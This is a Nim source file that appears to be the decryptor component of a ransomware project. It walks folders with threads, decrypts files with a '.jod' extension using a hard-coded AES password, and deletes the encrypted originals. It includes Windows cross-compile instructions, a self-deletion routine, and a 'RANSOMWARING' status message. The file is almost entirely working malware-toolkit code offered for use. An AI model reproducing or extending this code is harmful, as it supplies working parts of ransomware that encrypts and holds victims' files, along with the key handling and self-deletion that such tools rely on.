import nimAesCrypt
import os
import strenc
import threadpool
import std/os

# COMPILE: nim --threads:on -d:release c decrypt.nim
# For Windows: nim --threads:on -d:release --os:windows --cpu:amd64 --gcc.exe:x86_64-w64-mingw32-gcc --gcc.linkerexe:x86_64-w64-mingw32-gcc c decrypt.nim
# RUN: nim --threads:on -d:release r decrypt.nim ./somefolder/ ./sensfold/

proc DecryptFile(file: string) =
  {.gcsafe.}:
    #echo file[^4..^1] & " " & file[0..^5]
    if(file[^4..^1] != ".jod"):
        echo "File is not encrypted: " & file
        return
    let password = "THISISACOMPLEXPASSWRD_201334354357"
    let decryptedFile = file[0..^5]
    if not fileExists(file):
        echo "File not present ", file
        return
    decryptFile(file, decryptedFile,password,1024)
    removeFile(file)
    echo "File decrypted"


proc fileWalk(path: string) {.thread.}=
  for kind, path in walkDir(path):
    case kind:
    of pcFile:
      echo "File: ", path
      spawn DecryptFile(path)
    of pcDir:
      echo "Dir: ", path
      spawn fileWalk(path)
    of pcLinkToFile:
      echo "Link to file: ", path
    of pcLinkToDir:
      echo "Link to dir: ", path

proc selfDeletion() =
  let ownname = getAppFilename()
  echo "Deleting: ", ownname
  removeFile(ownname)

proc main() =
    # if not dirExists("./decryptedFolder/"):
    #     createDir("./decryptedFolder/")
    #     echo "Dir created: ./decryptedFolder/"
    # else:
    #     echo "Dir already exists"
    var filename = "./sensitiveFolder"
    var files : seq[string]
    if paramCount() > 0:
        for counter in 1..paramCount():    
          files.add(paramStr(counter))
          filename=paramStr(counter)
          if dirExists(filename):
              echo "Will Decrypt files in: ", filename
          else:
              echo "Folder does not exist: ", filename,"\nPlease enter a proper folder path. Preferably the full path."
              return
    else:
      files.add(filename)
    for file in files:
      echo "RANSOMWARING " & file
      spawn fileWalk(file)
    sync()



main()
